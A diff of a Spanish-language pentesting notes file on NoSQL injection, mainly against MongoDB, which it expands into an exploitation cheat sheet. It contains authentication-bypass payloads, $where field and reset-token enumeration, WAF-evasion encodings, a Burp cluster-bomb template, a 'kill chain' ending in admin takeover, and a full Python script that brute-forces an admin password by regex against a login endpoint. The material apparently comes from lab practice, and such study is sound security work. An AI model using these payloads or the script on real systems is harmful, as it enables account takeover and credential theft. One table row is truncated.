@@ -3,197 +3,606 @@
 Tags: #web #form #formularios #noRelacional #mongodb #nosqli 
 
 ---
-## 🧾 Definición
+# 📑 Índice
 
-> [[NoSQLI]]njection es una vulnerabilidad que permite a un atacante inyectar código malicioso en consultas de bases de datos **NoSQL** (como MongoDB, CouchDB o Firebase) al manipular los datos enviados al servidor.
+#### Introducción:
+- [[#1. Definición y fundamentos]]
+    
+- [[#2. Superficie de ataque y bases de datos afectadas]]
+    - [[#📚 Motores vulnerables]]
+    - [[#🎯 Objetivos del atacante]]
+    
+- [[#3. Metodología profesional de explotación]]
+	
 
-En lugar de usar SQL, se aprovechan estructuras como **JSON** para alterar la lógica de consultas.
+#### Técnicas:
+- [[#4. Detección de NoSQL Injection]]
+    - [[#🔎 Prueba lógica simple]]
+	
+- [[#5. Operator Injection (Auth Bypass)]]
+    - [[#🔓 Técnica principal]]
+	
+- [[#6. Blind NoSQLi – Extracción de datos]]
+    - [[#📏 Paso 1 – Longitud]]
+	
+- [[#7. Explotación avanzada con $where]]
+    - [[#🧠 Enumeración de campos]]
+    - [[#🧬 Extracción del token]]
+	
+- [[#8. Automatización (Scripts y Optimización)]]
+	- [[#¿Qué hace?]]
+	
+- [[#9. Evasión de filtros y WAF]]
+    - [[#🛡 9.1 Técnicas de evasión estructural]]
+    - [[#🔐 9.2 Encoding / representación alternativa]]
+    - [[#🔁 9.3 Sustitución de operadores]]
+    - [[#🧠 9.4 Bypass avanzado con `$where`]]
+    - [[#🔬 9.5 Bypass por estructura inesperada]]
+	
+
+#### Tablas, Resumenes y Recursos:
+- [[#10. Cadena ofensiva completa (Kill Chain práctica)]]
+    
+- [[#11. Tablas técnicas Cheatsheet (payloads, cluster bomb, bypass)]]
+    - [[#🔓 AUTH BYPASS PAYLOADS]]
+    - [[#📏 LONGITUD]]
+    - [[#🔎 EXTRACCIÓN POR REGEX]]
+    - [[#🧬 EXTRACCIÓN CON `$where`]]
+    - [[#🛡 BYPASS WAF AVANZADOS]]
+    - [[#🛡 BYPASS WAF AVANZADOS]]
+    - [[#🎯 CLUSTER BOMB TEMPLATE]]
+    
+- [[#12. Herramientas y referencias]]
+    
 
 ---
-## 📚 Bases de datos vulnerables
 
-- **MongoDB**
-- **CouchDB**
-- **Firebase**
-- **ElasticSearch**
-- **Redis** (algunas configuraciones)
-- **Cassandra**
+# 1. Fundamentos de NoSQL Injection
 
----
-## 🎯 Objetivos del atacante
+> NoSQL Injection es la manipulación de consultas NoSQL mediante la inyección de operadores o estructuras JSON que alteran la lógica de filtrado.
 
-- Autenticación Bypass
-    
-- Exfiltración de datos
-    
-- Acceso no autorizado a cuentas de usuarios
-    
-- Enumeración de usuarios o contraseñas
-    
+En motores como **MongoDB**, las consultas aceptan objetos:
+
+db.users.find({ username: input })
+
+Si `input` es:
+
+{ "$ne": null }
+
+La consulta deja de buscar igualdad y pasa a buscar “cualquier valor distinto de null”.
 
 ---
-## 🧪 Metodología de ataque
 
-### 🔧 1. Operator Injection
+# 2. Superficie de ataque y contexto técnico
 
-|Operador|Descripción|Ejemplo de uso|
-|---|---|---|
-|`$ne`|No igual|`"username": {"$ne": null}`|
-|`$gt`|Mayor que|`"login": {"$gt": ""}`|
-|`$lt`|Menor que|`"login": {"$lt": "zzz"}`|
-|`$regex`|Expresión regular|`"pass": {"$regex": "^adm"}`|
-|`$in`|En lista de valores|`"user": {"$in": [...]}`|
-|`$where`|Ejecutar JS (MongoDB <=4)|`"user": {"$where": ...}`|
+## Motores comunes
+
+- MongoDB
+    
+- CouchDB
+    
+- Firebase
+    
+- ElasticSearch
+    
+- Redis (configuraciones específicas)
+    
+
+MongoDB es el caso más frecuente.
 
 ---
-## 🛠 Técnicas comunes de explotación
 
-### 🔓 Autenticación Bypass
-```http
-POST /login HTTP/1.1 Content-Type: application/x-www-form-urlencoded  username[$ne]=a&password[$ne]=a
-```
+## Formatos vulnerables
+
+|Tipo|Ejemplo|
+|---|---|
+|POST JSON|`Content-Type: application/json`|
+|POST urlencoded|`username[$ne]=x`|
+|GET|`?user=admin&pass[$regex]=^a`|
+|Blind lógico|comparación booleana|
+
+---
+
+# 3. Metodología profesional de explotación
+
+1️⃣ Identificar input controlado  
+2️⃣ Probar ruptura lógica (' || true || ')  
+3️⃣ Probar operator injection  
+4️⃣ Confirmar bypass  
+5️⃣ Extraer longitud  
+6️⃣ Extraer caracteres  
+7️⃣ Enumerar campos ocultos  
+8️⃣ Exfiltrar tokens
+
+---
+
+# 4. Detección de NoSQLi
+
+## Prueba booleana simple
+
+Tu ejemplo:
+
+`/filter?category=Gifts' || '1'=='1`
+
+También:
+
+`Gifts' || true || '`
+
+Si aparecen más resultados → la consulta se ha alterado.
+
+---
+
+## Detección mediante operadores
+
+username[$ne]=a
+
+Si cambia el comportamiento → operator injection confirmada.
+
+---
+
+# 5. Operator Injection (Auth Bypass)
+
+## JSON bypass
 
 ```json
-{   "username": { "$ne": null },   "password": { "$ne": null } }
+{  
+ "username": { "$ne": null },  
+ "password": { "$ne": null }  
+}
 ```
+
+Selecciona cualquier documento válido.
 
 ---
-### 🧵 Extracción de datos (por caracteres)
 
-#### Extraer longitud
-
-```http
-`username[$ne]=a&password[$regex]=.{5}
-```
-#### Extraer datos paso a paso
-
-`username[$ne]=a&password[$regex]=^p 
-`username[$ne]=a&password[$regex]=^pa`
-`username[$ne]=a&password[$regex]=^pas ...`
-#### JSON
+## Regex targeting admin
 
 ```json
-{ "username": { "$eq": "admin" }, "password": { "$regex": "^adm" } }
+{  
+ "username": { "$regex":"^adm" },  
+ "password": { "$ne": null }  
+}
+```
+
+Selecciona cuentas tipo admin.
+
+---
+
+## Variaciones profesionales
+
+|Payload|Explicación breve|
+|---|---|
+|`{ "$gt": "" }`|Selecciona cualquier string mayor que vacío|
+|`{ "$in": ["admin","root"] }`|Fuerza coincidencia si alguno existe|
+|`{ "$exists": true }`|Campo existe|
+|`{ "$not": {"$eq": null} }`|Alternativa a `$ne:null`|
+
+---
+
+# 6. Blind NoSQLi – Extracción estructurada
+
+## Paso 1 – Longitud
+
+this.password.length > 7
+
+Optimizar con búsqueda binaria.
+
+## Paso 2 – Regex incremental
+
+```textplain
+^a  
+^ad  
+^adm
+```
+
+Ejemplo JSON:
+
+```json
+"password":{"$regex":"^adm"}
 ```
 
 ---
 
-### 🔐 Evadir WAF / Filtros
+## Paso 3 – Extracción por índice (alternativa)
 
-> 🧠 En MongoDB, si hay claves repetidas, se usa la última:
+"$where":"this.password[0]=='a'"
 
-`{"id":"10", "id":"100"}`
-
-Resultado: `"id":"100"`
+Más preciso que regex en algunos escenarios.
 
 ---
-## 🔍 Tipos de NoSQLi
 
-|Tipo|Método|Ejemplo|
+# 7. Explotación avanzada con `$where` (Estructurado y operativo)
+
+> `$where` permite ejecutar **JavaScript sobre cada documento**.  
+> Es extremadamente potente cuando está habilitado.
+
+---
+
+## 🧠 7.1 Enumeración estructural del documento
+
+### 🔎 Descubrir número de campos
+
+|Objetivo|Payload|Qué evalúa|Resultado esperado|
+|---|---|---|---|
+|Contar campos|`"$where":"Object.keys(this).length==6"`|Número total de propiedades|True cuando coincide|
+|Mayor que|`"$where":"Object.keys(this).length>5"`|Búsqueda progresiva|Ajustar hasta exacto|
+|Menor que|`"$where":"Object.keys(this).length<10"`|Acotar rango|Optimización tipo binary search|
+
+---
+
+## 🔍 7.2 Enumerar nombre de campos (Tu técnica real)
+
+### Payload base que usaste:
+
+```json
+{  
+ "username":"carlos",  
+ "password":{"$ne":null},  
+ "$where":"Object.keys(this)[4].match('^.{}.*')"  
+}
+```
+
+### Método profesional estructurado
+
+|Paso|Payload tipo|Explicación|
 |---|---|---|
-|POST con JSON|API REST|`Content-Type: application/json`|
-|POST urlencoded|Formularios web|`username[$ne]=x&password[$ne]=x`|
-|GET|Parámetros en la URL|`?username=admin&password[$regex]=^a`|
-|Blind NoSQLi|Tiempo o comparación indirecta|Ataques por fuerza bruta secuencial|
+|Descubrir índice válido|`Object.keys(this)[0]`|Probar índices 0–20|
+|Extraer primer carácter|`match('^u')`|Si devuelve true → empieza por "u"|
+|Construcción progresiva|`match('^us')`|Enumeración incremental|
+|Completar campo|`username`, `email`, `newPwdTkn`|Campo reconstruido|
 
 ---
-## 🧪 Ejemplo: Fuerza bruta con JSON (POST)
+
+## 🧬 7.3 Extracción de valor de campo desconocido (Tu caso real)
+
+Payload tuyo:
+
+`"$where":"this.newPwdTkn.match('^.{}.*')"`
+
+### Variante estructurada para cluster bomb
+
+`"$where":"this.newPwdTkn.match('^§prefix§')"`
+
+|Técnica|Payload ejemplo|Explicación|
+|---|---|---|
+|Prefijo simple|`^a`|Primer carácter|
+|Segundo carácter|`^ab`|Confirmación progresiva|
+|Posición específica|`^.{3}a`|Carácter en índice 3|
+|Índice directo|`this.newPwdTkn[0]=='a'`|Alternativa sin regex|
+
+---
+
+## 🔬 Comparativa Regex vs Índice directo
+
+|Método|Ventaja|Desventaja|
+|---|---|---|
+|`match("^abc")`|Flexible|Más ruido|
+|`this.field[i]=='a'`|Preciso|Requiere índice|
+|`length`|Rápido|Solo estructura|
+
+---
+
+# 8. Automatización ofensiva (Script completo profesional)
+
+Ahora sí, versión completa, estructurada en fases, usando tu lógica original pero mejorada.
+
+---
+
+## 🧠 Fases del script
+
+1. Detectar longitud
+    
+2. Extraer password carácter a carácter
+    
+3. Optimizar charset
+    
+4. Manejar errores
+    
+
+---
+
+## 🧪 Script completo mejorado
 
 ```python
-#!/usr/bin/python3
-
-from pwn import *
-import requests, time, sys, signal, string
-
-def def_handler(sig, frame):
-    print("\n\n[!] Saliendo... \n\n")
-    sys.exit(0)
-
-#Ctrl + C
-signal.signal(signal.SIGINT, def_handler)
-
-#Variables Globales
-
-login_url = "http://localhost:4000/user/login"
-characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
-
-def makeNoSQLI():
-
-    password = ""
-
-    p1=log.progress("Fuerza bruta")
-    p1.status("Iniciando fuerza bruta")
-    time.sleep(2)
-    p2 = log.progress("Password")
-
-    for position in range (1,25):
-        for char in characters:
-
-            post_data = '{"username": "admin", "password": {"$regex": "^%s%s"}}' % (password, char)
-
-            p1.status(post_data)
-
-            headers = {'Content-Type': 'application/json'}
-
-            r = requests.post(login_url, headers=headers, data=post_data)
-
-            if "Logged in as user" in r.text:
-                password += char
-                p2.status(password)
-                break
-
-if __name__ == '__main__':
-
-    makeNoSQLI()
-
+#!/usr/bin/python3  
+  
+import requests  
+import string  
+import sys  
+import signal  
+import time  
+  
+# CTRL+C handler  
+def def_handler(sig, frame):  
+    print("\n[!] Saliendo...\n")  
+    sys.exit(1)  
+  
+signal.signal(signal.SIGINT, def_handler)  
+  
+# CONFIGURACIÓN  
+url = "http://localhost:4000/user/login"  
+headers = {"Content-Type": "application/json"}  
+  
+charset = string.ascii_lowercase + string.ascii_uppercase + string.digits  
+  
+# -------------------------  
+# FASE 1: DETECTAR LONGITUD  
+# -------------------------  
+  
+def get_length():  
+  
+    print("[*] Detectando longitud...")  
+  
+    for length in range(1, 40):  
+  
+        payload = {  
+            "username": "admin",  
+            "password": {  
+                "$regex": "^.{%d}$" % length  
+            }  
+        }  
+  
+        r = requests.post(url, headers=headers, json=payload)  
+  
+        if "Logged in as user" in r.text:  
+            print(f"[+] Longitud encontrada: {length}")  
+            return length  
+  
+    return None  
+  
+  
+# -------------------------  
+# FASE 2: EXTRAER PASSWORD  
+# -------------------------  
+  
+def extract_password(length):  
+  
+    password = ""  
+    print("[*] Extrayendo contraseña...")  
+  
+    for position in range(length):  
+  
+        for char in charset:  
+  
+            attempt = password + char  
+  
+            payload = {  
+                "username": "admin",  
+                "password": {  
+                    "$regex": "^%s" % attempt  
+                }  
+            }  
+  
+            r = requests.post(url, headers=headers, json=payload)  
+  
+            if "Logged in as user" in r.text:  
+                password += char  
+                print(f"[+] Parcial: {password}")  
+                break  
+  
+    return password  
+  
+  
+# -------------------------  
+# MAIN  
+# -------------------------  
+  
+def main():  
+  
+    length = get_length()  
+  
+    if not length:  
+        print("[!] No se pudo determinar longitud.")  
+        return  
+  
+    password = extract_password(length)  
+  
+    print(f"\n[✔] Password final: {password}\n")  
+  
+  
+if __name__ == "__main__":  
+    main()
 ```
 
 ---
-## 🧪 Tu script personalizado explicado
 
-`post_data = '{"username": "admin", "password": {"$regex": "^%s%s"}}' % (password, char)`
+## 🔧 Mejoras adicionales posibles
 
-Esto genera un patrón **regex** que filtra el campo `password` comenzando con los caracteres correctos.
-
-> 💡 La respuesta `"Logged in as user"` indica acierto y permite construir la contraseña carácter a carácter.
+|Mejora|Cómo implementarla|
+|---|---|
+|Binary search longitud|Usar > y <|
+|Multithreading|concurrent.futures|
+|Time-based|Medir r.elapsed|
+|Detección bloqueo|Analizar status 429|
 
 ---
-## 🧰 Herramientas útiles
 
-|Herramienta|Descripción|Link|
+# 9. Evasión de filtros y WAF (Tabla ampliada profesional)
+
+---
+
+## 🛡 9.1 Técnicas de evasión estructural
+
+|Técnica|Payload|Explicación|
 |---|---|---|
-|**[NoSQLMap](https://github.com/codingo/NoSQLMap)**|Automatiza ataques NoSQLi|`codingo/NoSQLMap`|
-|**[digininja/nosqlilab](https://github.com/digininja/nosqlilab)**|Laboratorio práctico de NoSQLi|`digininja/nosqlilab`|
-|**Burp NoSQLiScanner**|Extensión de Burp para detectar inyecciones NoSQL|En BApp Store|
-|**Postman**|Para construir peticiones con payloads personalizados|GUI muy útil|
+|Duplicar clave|`{"id":"1","id":"2"}`|Mongo usa la última|
+|Array wrapping|`"password":[{"$ne":null}]`|Algunos parsers lo aceptan|
+|Tipo diferente|`"password":{"$ne":1}`|Evita filtros string|
+|Null byte|`"admin\0"`|Algunos filtros lo cortan|
+|Boolean injection|`"password":true`|Alterar tipo|
 
 ---
 
-## 📡 MongoDB como ejemplo principal
+## 🔐 9.2 Encoding / representación alternativa
 
-- MongoDB almacena documentos BSON (JSON binario).
-    
-- La inyección suele ir dirigida a:
-    
-    - Operadores como `$regex`, `$ne`, `$gt`
-        
-    - Claves manipuladas como `"username[$ne]=x"`
-        
+|Técnica|Ejemplo|Uso|
+|---|---|---|
+|Double encoding|`%2524ne`|Evadir detección `$`|
+|Unicode escape|`\u0024ne`|`$` en unicode|
+|URL encode|`%24ne`|Forma básica|
+|JSON spacing|`{ "$ne" : null }`|Bypass regex pobre|
+|Case variation|`$Ne`|Algunos WAF case-sensitive|
+
+---
+
+## 🔁 9.3 Sustitución de operadores
+
+Si bloquean `$regex`:
+
+|Alternativa|Ejemplo|Uso|
+|---|---|---|
+|`$gt`|`{"$gt":""}`|Cualquier string|
+|`$lt`|`{"$lt":"zzz"}`|Rango|
+|`$in`|`{"$in":["admin"]}`|Lista|
+|`$exists`|`{"$exists":true}`|Verificar campo|
+|`$not`|`{"$not":{"$eq":null}}`|Lógica inversa|
 
 ---
 
-## 🧠 Consejos de explotación
+## 🧠 9.4 Bypass avanzado con `$where`
 
-- Usa `$regex` con `^` para inicios de cadena.
-    
-- Evita caracteres conflictivos con URLencoding si es GET.
-    
-- En Blind NoSQLi usa respuestas HTTP (200/302) como canal de filtrado.
-    
-- Usa herramientas como Burp Repeater o Postman para verificar manualmente.
+|Payload|Explicación|
+|---|---|
+|`"$where":"1==1"`|Siempre verdadero|
+|`"$where":"this.a==1||
+|`"$where":"this.password.length>0"`|Comprobación indirecta|
+|Comentario JS|`//`|
 
 ---
-# Referencias
-- PayAllTheLoads:[Enlace](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
-- HackTricks:[Enlace](https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html)
-- Portswigger:[Enlace](https://portswigger.net/web-security/nosql-injection)
+
+## 🔬 9.5 Bypass por estructura inesperada
+
+|Técnica|Ejemplo|
+|---|---|
+|Objeto dentro de array|`[{"$ne":null}]`|
+|JSON nested|`{"a":{"b":{"$ne":null}}}`|
+|Campo repetido|`{"user":"a","user":{"$ne":null}}`|
+
+---
+
+# 10. Kill Chain ofensiva completa
+
+1. `' || true || '`
+    
+2. Confirmación operator injection
+    
+3. Bypass login
+    
+4. Enumeración usuario admin
+    
+5. Longitud password
+    
+6. Extracción password
+    
+7. Descubrir reset endpoint
+    
+8. Enumerar campos con `$where`
+    
+9. Extraer `newPwdTkn`
+    
+10. Reset admin
+    
+
+Impacto: compromiso total.
+
+---
+
+# 11. Tablas técnicas Cheatsheet (payloads, cluster bomb, bypass)
+
+|Técnica|Impacto|Ruido|Complejidad|
+|---|---|---|---|
+|`$ne` bypass|Alto|Bajo|Baja|
+|`$regex` blind|Alto|Medio|Media|
+|`$where` enum|Crítico|Bajo|Alta|
+|Token extraction|Crítico|Bajo|Alta|
+
+---
+
+## 🔓 AUTH BYPASS PAYLOADS
+
+| Payload                               | Explicación            |
+| ------------------------------------- | ---------------------- |
+| `{"$ne":null}`                        | Campo distinto de null |
+| `{"$gt":""}`                          | String mayor que vacío |
+| `{"$regex":".*"}`                     | Cualquier valor        |
+| `{"$exists":true}`                    | Campo existe           |
+| `{"$not":{"$eq":null}}`               | Alternativa lógica     |
+| `username[$ne]=a`                     | URL encoded            |
+| `username[$regex]=^adm`               | Target admin           |
+| `password[$in][]=a&password[$in][]=b` | Multi match            |
+
+---
+
+## 📏 LONGITUD
+
+|Payload|Explicación|
+|---|---|
+|`this.password.length>5`|Mayor que|
+|`this.password.length==8`|Exacto|
+|`this.password.length<10`|Menor que|
+
+---
+
+## 🔎 EXTRACCIÓN POR REGEX
+
+|Payload|Uso|
+|---|---|
+|`^a`|Primer carácter|
+|`^adm`|Prefijo|
+|`a$`|Último carácter|
+|`^.{5}a`|Carácter en posición 6|
+|`^.{0,3}a`|Rango|
+
+---
+
+## 🧬 EXTRACCIÓN CON `$where`
+
+|Payload|Explicación|
+|---|---|
+|`this.password[0]=='a'`|Índice directo|
+|`this.password.match('^adm')`|Prefijo|
+|`Object.keys(this)[0]`|Campo|
+|`Object.keys(this).length`|Nº campos|
+
+---
+
+## 🛡 BYPASS WAF AVANZADOS
+
+| Técnica         | Ejemplo                | Explicación breve          |
+| --------------- | ---------------------- | -------------------------- |
+| Double encode   | `%2524ne`              | Evadir filtros `$`         |
+| Unicode encode  | `\u0024ne`             | Representación alternativa |
+| Duplicar clave  | `{"a":1,"a":2}`        | Última prevalece           |
+| Tipo incorrecto | `{"$ne":1}`            | Cambia comparación         |
+| Array wrapping  | `[{"$ne":null}]`       | Bypass parser              |
+| Espacios JSON   | `{ "$ne" : null }`     | Algunos WAF fallan         |
+| Comentarios JS  | `$where:"this.a==1//"` | Si `$where` activo         |
+
+---
+
+## 🎯 CLUSTER BOMB TEMPLATE
+
+```json
+{  
+ "username":"carlos",  
+ "password":{"$ne":null},  
+ "$where":"Object.keys(this)[§pos§].match('^§char§')"  
+}
+```
+
+|Variable|Valores|
+|---|---|
+|§pos§|0–20|
+|§char§|a-zA-Z0-9_|
+
+---
+
+# 12. Herramientas y referencias
+
+- PortSwigger — Laboratorios NoSQLi
+    
+- PayloadsAllTheThings — Colección masiva de payloads
+    
+- NoSQLMap — Automatización
+    
+- HackTricks — Técnicas adicionales
